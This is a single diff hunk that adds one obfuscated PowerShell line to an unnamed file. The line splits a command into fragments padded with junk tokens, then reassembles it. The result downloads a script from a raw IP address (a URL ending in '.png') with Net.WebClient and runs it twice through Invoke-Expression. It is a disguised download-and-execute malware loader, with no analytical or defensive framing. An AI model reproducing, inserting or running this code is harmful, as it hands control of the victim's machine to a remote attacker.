@@ -1,0 +1,1 @@
+$c1='{AWA}(N{AWA}{AWA}e{AWA}w-{AWA}Ob{AWA}{AWA}je{AWA}{AWA}c{AWA}t N{AWA}{AWA}e{AWA}t.W{AWA}e';$c4='b{AWA}{AWA}Cli{AWA}{AWA}en{AWA}{AWA}t{AWA}).Do{AWA}{AWA}wn{AWA}{AWA}l{AWA}o';$c3='a{AWA}dS{AWA}{AWA}t{AWA}ri{AWA}{AWA}n{AWA}g{AWA}(''h{AWA}tt{AWA}p:/{AWA}/62.204.41.23/o.png''){AWA}';$TC=($c1,$c4,$c3 -Join '');$TC=$TC.replace('{AWA}','');IEX $TC|IEX 
